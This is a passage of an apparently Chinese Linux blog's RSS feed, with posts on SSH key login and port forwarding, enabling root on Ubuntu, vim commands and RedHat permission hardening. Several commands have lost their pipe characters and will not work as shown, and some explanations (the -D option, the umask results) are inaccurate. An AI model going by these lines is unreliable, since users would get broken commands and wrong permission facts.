<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'mkdir .ssh &amp;&amp; cat >> .ssh/authorized_keys'</span> <span>&lt;</span> ~/.ssh/id_rsa.pub
</code></pre><div aria-hidden="true"><div></div></div></div><p>这条命令由多个语句组成, 依次分解开来看:</p>
<ul>
<li><strong><code>ssh [userName]@[hostIP]</code></strong>, 表示登录远程主机</li>
<li>单引号中的 <strong><code>mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys</code></strong>, 表示登录后在远程 shell 上执行的命令</li>
<li><strong><code>mkdir .ssh</code></strong> 的作用是, 如果用户主目录中的 .ssh 目录不存在, 就创建一个</li>
<li><strong><code>cat &gt;&gt; .ssh/authorized_keys' &lt; ~/.ssh/id_rsa.pub</code></strong> 的作用是, 将本地的公钥文件 <code>~/.ssh/id_rsa.pub</code> , 重定向追加到远程文件 authorized_keys 的末尾。</li>
</ul>
<p>写入 authorized_keys 文件后, 公钥登录的设置就完成了。</p>
<h2 id="远程操作" tabindex="-1"> 远程操作</h2>
<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'mkdir .ssh &amp;&amp; cat >> .ssh/authorized_keys'</span> <span>&lt;</span> ~/.ssh/id_rsa.pub
</code></pre><div aria-hidden="true"><div></div></div></div><p>单引号中间的部分, 表示在远程主机上执行的操作；后面的输入重定向, 表示数据通过 SSH 传向远程主机。</p>
<p>这就是说, SSH 可以在用户和远程主机之间, 建立命令和数据的传输通道, 因此很多事情都可以通过 SSH 来完成。</p>
<h3 id="【例-1】" tabindex="-1"> 【例 1】</h3>
<p>将 <code>$HOME/src/</code> 目录下面的所有文件, 复制到远程主机的 <code>$HOME/src/</code> 目录。</p>
<div><pre><code><span>cd</span> <span>&amp;&amp;</span> <span>tar</span> czv src <span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'tar xz'</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="【例-2】" tabindex="-1"> 【例 2】</h3>
<p>将远程主机 <code>$HOME/src/</code> 目录下面的所有文件, 复制到用户的当前目录。</p>
<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'tar cz src'</span> <span>tar</span> xzv
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="【例-3】" tabindex="-1"> 【例 3】</h3>
<p>查看远程主机是否运行进程 httpd。</p>
<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'ps ax grep [h]ttpd'</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="绑定本地端口" tabindex="-1"> 绑定本地端口</h2>
<p>既然 SSH 可以传送数据, 那么我们可以让那些不加密的网络连接, 全部改走 SSH 连接, 从而提高安全性。</p>
<p>假定我们要让 8080 端口的数据, 都通过 SSH 传向远程主机, 命令就这样写:</p>
<div><pre><code><span>ssh</span> -D <span>8080</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>SSH 会建立一个 socket, 去监听本地的 8080 端口。一旦有数据传向那个端口, 就自动把它转移到 SSH 连接上面, 发往远程主机。可以想象, 如果 8080 端口原来是一个不加密端口, 现在将变成一个加密端口。</p>
<h2 id="本地端口转发" tabindex="-1"> 本地端口转发</h2>
<p>有时, 绑定本地端口还不够, 还必须指定数据传送的目标主机, 从而形成点对点的&quot;端口转发&quot;。为了区别后文的&quot;远程端口转发&quot;, 我们把这种情况称为&quot;本地端口转发&quot;（Local forwarding）。</p>
<p>假定 host1 是本地主机, host2 是远程主机。由于种种原因, 这两台主机之间无法连通。但是, 另外还有一台 host3, 可以同时连通前面两台主机。因此, 很自然的想法就是, 通过 host3, 将 host1 连上 host2。</p>
<p>我们在 host1 执行下面的命令:</p>
<div><pre><code><span>ssh</span> -L <span>2121</span>:<span>[</span>host2IP<span>]</span>:21 <span>[</span>host3IP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>命令中的 L 参数一共接受三个值, 分别是&quot;本地端口: 目标主机: 目标主机端口&quot;, 它们之间用冒号分隔。这条命令的意思, 就是指定 SSH 绑定本地端口 2121, 然后指定 host3 将所有的数据, 转发到目标主机 host2 的 21 端口（假定 host2 运行 FTP, 默认端口为 21）。</p>
<p>这样一来, 我们只要连接 host1 的 2121 端口, 就等于连上了 host2 的 21 端口。</p>
<div><pre><code><span>ftp</span> localhost:2121
</code></pre><div aria-hidden="true"><div></div></div></div><p>&quot;本地端口转发&quot;使得 host1 和 host3 之间仿佛形成一个数据传输的秘密隧道, 因此又被称为&quot;SSH 隧道&quot;。</p>
<h2 id="远程端口转发" tabindex="-1"> 远程端口转发</h2>
<p>既然&quot;本地端口转发&quot;是指绑定本地端口的转发, 那么&quot;远程端口转发&quot;（remote forwarding）当然是指绑定远程端口的转发。</p>
<p>还是接着看上面那个例子, host1 与 host2 之间无法连通, 必须借助 host3 转发。但是, 特殊情况出现了, host3 是一台内网机器, 它可以连接外网的 host1, 但是反过来就不行, 外网的 host1 连不上内网的 host3。这时, &quot;本地端口转发&quot;就不能用了, 怎么办?</p>
<p>解决办法是, 既然 host3 可以连 host1, 那么就从 host3 上建立与 host1 的 SSH 连接, 然后在 host1 上使用这条连接就可以了。</p>
<p>我们在 host3 执行下面的命令:</p>
<div><pre><code><span>ssh</span> -R <span>2121</span>:<span>[</span>host2IP<span>]</span>:21 <span>[</span>host1IP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>R 参数也是接受三个值, 分别是&quot;远程主机端口: 目标主机: 目标主机端口&quot;。这条命令的意思, 就是让 host1 监听它自己的 2121 端口, 然后将所有数据经由 host3, 转发到 host2 的 21 端口。由于对于 host3 来说, host1 是远程主机, 所以这种情况就被称为&quot;远程端口绑定&quot;。</p>
<p>绑定之后, 我们在 host1 就可以连接 host2 了:</p>
<div><pre><code><span>ftp</span> localhost:2121
</code></pre><div aria-hidden="true"><div></div></div></div><p>这里必须指出, &quot;远程端口转发&quot;的前提条件是, host1 和 host3 两台主机都有 sshD 和 ssh 客户端。</p>
<h2 id="shh-的其他参数" tabindex="-1"> SHH 的其他参数</h2>
<p>SSH 还有一些别的参数, 也值得介绍。</p>
<p>N 参数, 表示只连接远程主机, 不打开远程 shell；T 参数, 表示不为这个连接分配 TTY。这个两个参数可以放在一起用, 代表这个 SSH 连接只用来传数据, 不执行远程操作。</p>
<div><pre><code><span>ssh</span> -NT -D <span>8080</span> <span>[</span>hostIP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>f 参数, 表示 SSH 连接成功后, 转入后台运行。这样一来, 你就可以在不中断 SSH 连接的情况下, 在本地 shell 中执行其他操作。</p>
<div><pre><code><span>ssh</span> -f -D <span>8080</span> <span>[</span>hostIP<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>要关闭这个后台连接, 就只有用 kill 命令去杀掉进程。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu 开启 root 用户</title>
      <link>https://vxhly.github.io/views/liunx/ubuntu-enble-root.html</link>
      <guid>https://vxhly.github.io/views/liunx/ubuntu-enble-root.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Ubuntu 开启 root 用户</source>
      <description>前言
Ubuntu 默认不开启 root 账户的, 所以有需开启 root 账户的按照以下做法即可, 切换 root 账户后 chromium 浏览器不能使用。

</description>
      <category>liunx</category>
      <pubDate>Tue, 02 Aug 2016 15:29:46 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Ubuntu 默认不开启 root 账户的, 所以有需开启 root 账户的按照以下做法即可, 切换 root 账户后 chromium 浏览器不能使用。</p>
</div>

<h2 id="打开终端开启-root-账户" tabindex="-1"> 打开终端开启 root 账户</h2>
<div><pre><code><span>sudo</span> <span>passwd</span> -u root
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="为-root-账户设置密码" tabindex="-1"> 为 root 账户设置密码</h2>
<p>输入两次</p>
<div><pre><code><span>sudo</span> <span>passwd</span> root
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="测试-root-账户" tabindex="-1"> 测试 root 账户</h3>
<p>输入 root 密码, 进入 root 终端</p>
<div><pre><code><span>su</span> -
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="设置登录面板-使其实现-root-登录" tabindex="-1"> 设置登录面板, 使其实现 root 登录</h2>
<p>使用 <code>vim</code></p>
<div><pre><code><span>sudo</span> <span>vim</span> /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf
</code></pre><div aria-hidden="true"><div></div></div></div><p>使用 <code>gedit</code></p>
<div><pre><code><span>sudo</span> gedit /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf
</code></pre><div aria-hidden="true"><div></div></div></div><p>添加如下代码, 保存退出</p>
<div><pre><code>user-session<span>=</span>ubuntu
greeter-show-manual-login<span>=</span>true
all-guest<span>=</span>false
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="重启-ubuntu-需切换-root-账户" tabindex="-1"> 重启 ubuntu, 需切换 root 账户</h2>
<div><pre><code><span>su</span> -
<span>reboot</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="删除原先账户" tabindex="-1"> 删除原先账户</h2>
<p>如果你不喜欢原先的账户, 大可以彻底删除用户</p>
<h3 id="在-root-用户下" tabindex="-1"> 在 root 用户下</h3>
<div><pre><code><span>userdel</span> -r userName
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="在普通用户下" tabindex="-1"> 在普通用户下</h3>
<div><pre><code><span>sudo</span> <span>userdel</span> -r userName
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>注意</p>
<p>因为需要彻底删除用户, 所以加上 的选项, 在删除用户的同时一起把这个用户的宿主目录和邮件目录删除；userName 需替换成你的原先账户名</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Liunx 学习笔记（二）vim 的使用</title>
      <link>https://vxhly.github.io/views/liunx/usage-of-vim.html</link>
      <guid>https://vxhly.github.io/views/liunx/usage-of-vim.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 学习笔记（二）vim 的使用</source>
      <description>前言
本篇是 Liunx 的学习笔记系列第二篇, 这一篇将介绍 vim 的使用技巧。vim 是一款终端编辑器, 是由 vi 演变而来的, 它与 vi 最大的区别是, vim 拥有代码高亮, 其他操作都是共用的。

</description>
      <category>liunx</category>
      <pubDate>Thu, 08 Sep 2016 22:20:23 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的学习笔记系列第二篇, 这一篇将介绍 vim 的使用技巧。vim 是一款终端编辑器, 是由 vi 演变而来的, 它与 vi 最大的区别是, vim 拥有代码高亮, 其他操作都是共用的。</p>
</div>

<h2 id="vim-常用操作" tabindex="-1"> vim 常用操作</h2>
<h3 id="打开文件操作" tabindex="-1"> 打开文件操作</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>vi</strong></td>
<td>进入 vi 而不读入任何文件</td>
</tr>
<tr>
<td><strong>vi [fileName]</strong></td>
<td>进入 vi 并读入指定名称的文件（新、旧文件均可）。</td>
</tr>
<tr>
<td><strong>vi +n [fileName]</strong></td>
<td>进入 vi 并且由文件的第几行开始。</td>
</tr>
<tr>
<td><strong>vi + [fileName]</strong></td>
<td>进入 vi 并且由文件的最后一行开始。</td>
</tr>
<tr>
<td><strong>vi +/pattern [fileName]</strong></td>
<td>打开文件, 并将光标置于第一个与 pattern 匹配的串处</td>
</tr>
<tr>
<td><strong>vi [fileName]....[fileName]</strong></td>
<td>打开多个文件, 依次进行编辑</td>
</tr>
<tr>
<td><strong>vi -r [fileName]</strong></td>
<td>在上次正用 vi 编辑时发生系统崩溃, 恢复 [fileName]</td>
</tr>
<tr>
<td><strong>vimdiff fileA fileB</strong></td>
<td>比较编辑两个不同的文件</td>
</tr>
</tbody>
</table>
<h3 id="vim-操作模式转换图" tabindex="-1"> vim 操作模式转换图</h3>
<p><img src="/assets/liunx-vim.png" alt="vim 操作模式转换图"></p>
<h3 id="插入命令" tabindex="-1"> 插入命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>a</strong></td>
<td>在光标所在行行尾插入</td>
</tr>
<tr>
<td><strong>i</strong></td>
<td>在光标所在字符前插入</td>
</tr>
<tr>
<td><strong>I</strong></td>
<td>在光标所在行行首插入</td>
</tr>
<tr>
<td><strong>o</strong></td>
<td>在光标下插入新行</td>
</tr>
<tr>
<td><strong>O</strong></td>
<td>在光标上插入新行</td>
</tr>
</tbody>
</table>
<h3 id="定位命令" tabindex="-1"> 定位命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>:set nu</strong></td>
<td>设置行号</td>
</tr>
<tr>
<td><strong>:set nonu</strong></td>
<td>取消行号</td>
</tr>
<tr>
<td><strong>gg</strong></td>
<td>到第一行</td>
</tr>
<tr>
<td><strong>G</strong></td>
<td>到最后一行</td>
</tr>
<tr>
<td><strong>nG</strong></td>
<td>到第 n 行</td>
</tr>
<tr>
<td><strong>:n</strong></td>
<td>到第 n 行</td>
</tr>
<tr>
<td><strong>$</strong></td>
<td>光标移至行尾</td>
</tr>
<tr>
<td><strong>0</strong></td>
<td>光标移至行首</td>
</tr>
</tbody>
</table>
<h3 id="删除命令" tabindex="-1"> 删除命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>x</strong></td>
<td>删除光标所在处字符</td>
</tr>
<tr>
<td><strong>nx</strong></td>
<td>删除光标所在处后 n 个字符</td>
</tr>
<tr>
<td><strong>dd</strong></td>
<td>删除光标所在行</td>
</tr>
<tr>
<td><strong>ndd</strong></td>
<td>删除 n 行</td>
</tr>
<tr>
<td><strong>dG</strong></td>
<td>删除光标所在行到文件末尾内容</td>
</tr>
<tr>
<td><strong>D</strong></td>
<td>删除光标所在处至行尾内容</td>
</tr>
<tr>
<td><strong>:n1, n2d</strong></td>
<td>删除第 n1 行到第 n2 行</td>
</tr>
</tbody>
</table>
<h3 id="复制和剪切命令" tabindex="-1"> 复制和剪切命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>yy</strong></td>
<td>复制当前行</td>
</tr>
<tr>
<td><strong>nyy</strong></td>
<td>复制当前行（包含当前行）以下 n 行</td>
</tr>
<tr>
<td><strong>dd</strong></td>
<td>剪切当前行</td>
</tr>
<tr>
<td><strong>ndd</strong></td>
<td>剪切当前行（包含当前行）以下 n 行</td>
</tr>
<tr>
<td><strong>p</strong></td>
<td>粘贴在当前光标所在行的下一行</td>
</tr>
<tr>
<td><strong>P</strong></td>
<td>粘贴在当前光标所在行的上一行</td>
</tr>
<tr>
<td><strong>nyl</strong></td>
<td>复制 n 个字符</td>
</tr>
<tr>
<td><strong>yw</strong></td>
<td>复制一个单词</td>
</tr>
<tr>
<td><strong>y$</strong></td>
<td>复制从当前位置到行尾</td>
</tr>
<tr>
<td><strong>yG</strong></td>
<td>复制从所在行到最后一行</td>
</tr>
<tr>
<td><strong>:n1, n2 co n3</strong></td>
<td>将 n1 行到 n2 行之间的内容拷贝到第 n3+1 行【n3 行的下一行】</td>
</tr>
<tr>
<td><strong>:n1, n2 m n3</strong></td>
<td>将 n1 行到 n2 行之间的内容移至到第 n3 行下</td>
</tr>
<tr>
<td><strong>J</strong></td>
<td>把下一行的数据连接到本行之后</td>
</tr>
</tbody>
</table>
<h3 id="替换和取消命令" tabindex="-1"> 替换和取消命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>r</strong></td>
<td>取代光标所在处字符</td>
</tr>
<tr>
<td><strong>R</strong></td>
<td>从光标所在处开始替换字符, 按 Esc 结束</td>
</tr>
<tr>
<td><strong>u</strong></td>
<td>取消上一步操作</td>
</tr>
</tbody>
</table>
<h3 id="搜索和搜索替换命令" tabindex="-1"> 搜索和搜索替换命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>/string</strong></td>
<td>搜索指定字符串</td>
</tr>
<tr>
<td><strong>:set ic</strong></td>
<td>搜索时忽略大小写</td>
</tr>
<tr>
<td><strong>:set noic</strong></td>
<td>取消搜索时忽略大小写</td>
</tr>
<tr>
<td><strong>n</strong></td>
<td>搜索指定字符串的下一个出现位置（即同方向）</td>
</tr>
<tr>
<td><strong>N</strong></td>
<td>在反方向上重复上一次搜索命令</td>
</tr>
<tr>
<td><strong>:%s/old/new/g</strong></td>
<td>全文替换指定字符串；需要替换询问时, g 改成 c</td>
</tr>
<tr>
<td><strong>:n1, n2s/old/new/g</strong></td>
<td>在一定方位范围内替换指定字符串；需要替换询问时, g 改成 c</td>
</tr>
</tbody>
</table>
<h3 id="保存和退出命令" tabindex="-1"> 保存和退出命令</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>:w</strong></td>
<td>保存修改</td>
</tr>
<tr>
<td><strong>:w /[path]/[fileName]</strong></td>
<td>另存为指定文件</td>
</tr>
<tr>
<td><strong>:wq</strong>, <strong>:x</strong></td>
<td>保存修改并退出</td>
</tr>
<tr>
<td><strong>ZZ</strong></td>
<td>快捷键, 保存修改并退出</td>
</tr>
<tr>
<td><strong>:q!</strong></td>
<td>不保存修改并退出</td>
</tr>
<tr>
<td><strong>:wq!</strong></td>
<td>保存修改并退出（文件所有者及 root 可使用, 通常在文件无写权限下使用）</td>
</tr>
<tr>
<td><strong>:n1, n2 w ! command</strong></td>
<td>将文件中 n1 行至 n2 行的内容作为 command 的输入并执行之, 若不指定 n1, n2, 则表示将整个文件内容作为 command 的输入【注意空格】例如 <code>:1,4 w! grep tom</code></td>
</tr>
<tr>
<td><strong>:!command</strong></td>
<td>暂时退出 vi 并执行 shell 指令, 执行完毕后再回到 vi。【后期应该有用】</td>
</tr>
<tr>
<td><strong>:r!command</strong></td>
<td>将命令 command 的输出结果放到当前行【强大】</td>
</tr>
<tr>
<td><strong>:sh</strong></td>
<td>暂时退出 vi 到系统下, 结束时按 <code>Ctrl + d</code> 则回到 vi。</td>
</tr>
<tr>
<td><strong>:e [fileName]</strong></td>
<td>打开文件 [fileName] 进行编辑【相当于退出当前的并打开另一个文件】</td>
</tr>
<tr>
<td><strong>:e!</strong></td>
<td>放弃修改文件内容, 重新载入该文件编辑</td>
</tr>
<tr>
<td><strong>:w !sudo tee %</strong></td>
<td>以普通用户身份打开的 vim , 修改后以 root 身份保存</td>
</tr>
</tbody>
</table>
<h2 id="vim-使用技巧" tabindex="-1"> vim 使用技巧</h2>
<h3 id="导入文件内容" tabindex="-1"> 导入文件内容</h3>
<div><pre><code>:r /<span>[</span>path<span>]</span>/<span>[</span>fileName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="导入命令执行结果" tabindex="-1"> 导入命令执行结果</h3>
<div><pre><code>:r <span>!</span>command
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="寻找命令所在目录" tabindex="-1"> 寻找命令所在目录</h3>
<div><pre><code>:<span>!</span>which <span>command</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="定义快捷键" tabindex="-1"> 定义快捷键</h3>
<div><pre><code>:map ^P I<span>#&lt;ESC>      # 按 Ctrl+P 组合键用 # 注释当前行</span>
:map ^B 0x         <span># 按 Ctrl+B 组合键删除当前行的注释</span>
:map ^H istring<span>&lt;</span>ESC<span>></span>   <span># 按 Ctrl+H 组合键在光标所在位置插入字符串</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p><code>:map</code> 定义快捷键时, 按 Ctrl+V+key 定义快捷键；<code>:map</code> 定义的快捷键, 重启或关机失效</p>
</div>
<h3 id="连续行注释" tabindex="-1"> 连续行注释</h3>
<div><pre><code>:n1,n2s/^/<span>#/g     # 在 n1 行到 n2 行首添加注释 #</span>
:n1,n2s/^<span>#//g     # 在 n1 行到 n2 行首删除注释 #</span>
:n1,n2s/^/<span>\</span>/<span>\</span>//g   <span># 在 n1 行到 n2 行首添加注释 //</span>
:n1,n2s/^<span>\</span>/<span>\</span>//g    <span># 在 n1 行到 n2 行首删除注释 //</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="替换" tabindex="-1"> 替换</h3>
<div><pre><code>:ab string1 string2    <span># 输入 string1 将会被替换成 string2</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="编辑模式命令-永久生效" tabindex="-1"> 编辑模式命令, 永久生效</h3>
<p><code>普通</code> 用户</p>
<div><pre><code><span>vim</span> /home/<span>[</span>userName<span>]</span>/.vimrc
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>root</code> 用户</p>
<div><pre><code><span>vim</span> /root/.vimrc
</code></pre><div aria-hidden="true"><div></div></div></div><p>添加类似于以下命令代码, 无需添加 :</p>
<div><pre><code><span>set</span> nu
map ^P I<span>#&lt;ESC></span>
ab <span>test</span> this is test,this is test,this is test.
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-vim.png" type="image/png"/>
    </item>
    <item>
      <title>RedHat 系统安全加固（二）用户和文件权限</title>
      <link>https://vxhly.github.io/views/liunx/user-and-file-permissions.html</link>
      <guid>https://vxhly.github.io/views/liunx/user-and-file-permissions.html</guid>
      <source url="https://vxhly.github.io/rss.xml">RedHat 系统安全加固（二）用户和文件权限</source>
      <description>前言
本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录用户和文件的权限（主要是特殊权限）, 加强系统的防御能力。

</description>
      <category>liunx</category>
      <pubDate>Fri, 14 Oct 2016 22:08:33 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录用户和文件的权限（主要是特殊权限）, 加强系统的防御能力。</p>
</div>

<h2 id="主要的介绍" tabindex="-1"> 主要的介绍</h2>
<p>Linux 文件系统的安全主要是通过设置文件的权限来实现的。每一个 Linux 的文件或目录, 都有 3 组属性, 分别定义文件或目录的所有者, 用户组和其他人的使用权限（ <code>只读</code> 、 <code>可写</code> 、 <code>可执行</code> 、 <code>允许 SUID</code> 、 <code>允许 SGID</code> 等）。特别注意, 权限为 <code>SUID</code> 和 <code>SGID</code> 的可执行文件, 在程序运行过程中, 会给进程赋予所有者的权限, 如果被黑客发现并利用就会给系统造成危害。</p>
<h2 id="查找同时存在-suid-和-sgid-的文件" tabindex="-1"> 查找同时存在 SUID 和 SGID 的文件</h2>
<p>使用 <code>find</code> 命令</p>
<div><pre><code><span>find</span> / -xdev -perm  -6000
</code></pre><div aria-hidden="true"><div></div></div></div><p>举例, 普通用户无法直接 vi 修改 <code>/etc/passwd</code> 文件, 但却可以通过 <code>passwd</code> 命令来修改自身的密码。这时就利用了 <code>/bin/passwd</code> 的 SUID 的权限。</p>
<p>如果一个程序被设置成了 <code>S</code> 位标志, 那么普通用户就可以以 root 身份来运行这个程序。对系统安全性有较大不利影响, 所以应禁止所有不必要的 <code>SUID/SGID</code> 程序。</p>
<p>修改部分系统文件的 SUID 和 SGID 的权限:</p>
<div><pre><code><span>chmod</span> a-s /usr/bin/chage
<span>chmod</span> a-s /usr/bin/gpasswd
<span>chmod</span> a-s /usr/bin/wall
<span>chmod</span> a-s /usr/bin/chfn
<span>chmod</span> a-s /usr/bin/chsh
<span>chmod</span> a-s /usr/bin/newgrp
<span>chmod</span> a-s /usr/bin/write
<span>chmod</span> a-s /usr/sbin/usernetctl
<span>chmod</span> a-s /bin/mount
<span>chmod</span> a-s /bin/umount
<span>chmod</span> a-s /sbin/netreport
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="find-命令" tabindex="-1"> find 命令</h3>
<p>选项解释</p>
<ul>
<li><strong><code>-perm &lt;权限数值&gt;</code></strong> =&gt; 查找符合指定的权限数值的文件或目录；</li>
<li><strong><code>-xdev</code></strong> =&gt; 将范围局限在先行的文件系统中；</li>
<li><code>find -perm mode</code> =&gt; 表示严格匹配, 也就是你的文件权限位转换成对应的十进制数字与 mode 一模一样, 那么匹配成功, 需要注意的是如果 mode 给的数字不足 3 位, 那么前面自动添 0 (严格的说是不足 4 位, 原因就是前面所说的 <code>SetUID</code> , <code>SetGID</code> ）</li>
<li><code>find -perm -mode</code> =&gt; 表示模糊查询, 也就是说你的文件权限位转换成对应的十进制数字被 mode 包含, 就会被搜索出来</li>
<li><code>find -perm +mode</code> =&gt; 与 <code>-mode</code> 的区别是 <code>+mode</code> 只需其中的任意一个 1 的部分被匹配, <code>-mode</code> 是所有 1 的部分都必须被匹配, 同样 <code>+mode</code> 也不管 0 位</li>
</ul>
<h2 id="文件的默认权限" tabindex="-1"> 文件的默认权限</h2>
<p>使用 <code>umask</code> 指定当前用户创建文件夹和文件的默认权限属性</p>
<ul>
<li>若使用者建立为 <code>文件</code> , 则预设 <code>没有可执行 ( x ) 项目</code> , 亦即只有 <code>rw</code> 这两个项目, 也就是最大为 <code>666</code> , 即权限为 <code>-rw-rw-rw-</code></li>
<li>若使用者建立为 <code>目录</code> , 则由于 <code>x</code> 与是否可以进入此目录有关, 因此预设为所有权限均开放, 亦即为 <code>777</code> , 即权限为 <code>drwxrwxrwx</code></li>
</ul>
<h3 id="修改默认权限" tabindex="-1"> 修改默认权限</h3>
<p>主要修改配置文件 <code>/etc/profile</code> 、 <code>/etc/bashrc</code> 、 <code>/etc/csh.login</code> 、 <code>/etc/csh.cshrc</code></p>
<ul>
<li>生成目录的权限为 <code>777-002=775</code> , 即 <code>drwxrwxr-x</code></li>
<li>生成文件的权限为 <code>666-002=664</code> , 即 <code>-rw-rw-r--</code> <code>For Exmaple:</code></li>
</ul>
<div><pre><code><span>umask</span> 002
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li>生成目录的权限为 <code>777-022=755</code> , 即 <code>drwxrwxr-x</code></li>
<li>生成文件的权限为 <code>666-022=644</code> , 即 - <code>rw-r--r--</code> <code>For Exmaple:</code></li>
</ul>
<div><pre><code><span>umask</span> 022
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>注意</p>
<p>不要单纯的进行数字加减<br> 比如, <code>umask 003</code> , 如果以数字加减, 则文件权限为 <code>666-003=663</code> , 相当于 <code>-rw-rw--wx</code> , 显然不正确, 应该先转换成权限属性再相减 <code>-rw-rw-rw-</code> 减去 <code>--------wx</code> , 即应该为 <code>-rw-rw-r--</code> <br> 影响: 移动规范要求 <code>umask 027</code> , 这样生成的文件默认权限为 <code>-rw-r-----</code> , 只有本用户可读、写、执行。如果业务需要, 其他用户也需要操作该 用户的文件, 就会有问题。可以使用默认的 <code>022</code></p>
</div>
<h2 id="环境变量的安全性" tabindex="-1"> 环境变量的安全性</h2>
<h3 id="root-用户环境变量的安全性" tabindex="-1"> root 用户环境变量的安全性</h3>
<p>主要检查 <code>PATH</code> 变量, <code>For Exmaple:</code></p>
<div><pre><code><span>echo</span> <span>$PATH</span> <span>|</span> <span>egrep</span> <span>'(^|:)(\.|:|$)'</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/redhat-reinforce-12.png" alt="RedHat 安全加固"></p>
<p>检查是否包含组目录权限为 <code>o+w</code> 的目录或者 <code>g+w</code> 的目录</p>
<div><pre><code><span>find</span> <span><span>`</span><span>echo</span> <span>$PATH</span> <span>|</span> <span>tr</span> <span>':'</span> <span>' '</span><span>`</span></span> -type d <span>\</span><span>(</span> -perm -002 -o -perm -020 <span>\</span><span>)</span> -ls
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li><code>-002</code> 表示任何目录或文件, 只要带 <code>o+w</code> 就匹配</li>
<li><code>+002</code> 表示目录或文件只有 <code>o+w</code> 权限, 即 <code>-------w-</code> 可能会出现报错提示 <code>/root/bin</code> 目录不存在, <code>PATH</code> 里有该路径, 而实际上没有, 可以先在 <code>/root</code> 下建立一个 <code>bin</code> 目录</li>
</ul>
<h3 id="检查-root-用户环境变量-path-规范" tabindex="-1"> 检查 root 用户环境变量 path 规范</h3>
<p>检查系统 root 用户环境变量 path 中是否包含 <code>“.”</code> , <code>For Exmaple:</code></p>
<div><pre><code><span>env</span> <span>|</span> <span>grep</span> <span>PATH</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>修改文件 <code>/etc/profile</code> 、 <code>/etc/bashrc</code> 或 <code>/root/.bash_profile</code> 在 <code>“PATH＝……”</code> 这句中删除</p>
<ul>
<li><code>-002</code> 表示任何目录或文件, 只要带 <code>o+w</code> 就匹配</li>
<li><code>+002</code> 表示目录或文件只有 <code>o+w</code> 权限, 即 <code>-------w-</code> 可能会出现报错提示 <code>/root/bin</code> 目录不存在, <code>PATH</code> 里有该路径, 而实际上没有, 可以先在 <code>/root</code> 下建立一个 <code>bin</code> 目录</li>
</ul>
<h2 id="远程连接的安全性配置" tabindex="-1"> 远程连接的安全性配置</h2>
<p>主要查找系统中是否含有 <code>.netrc</code> 和 <code>.rhosts</code> 文件, 如无必要, 删除这两个文件, <code>For Exmaple:</code></p>
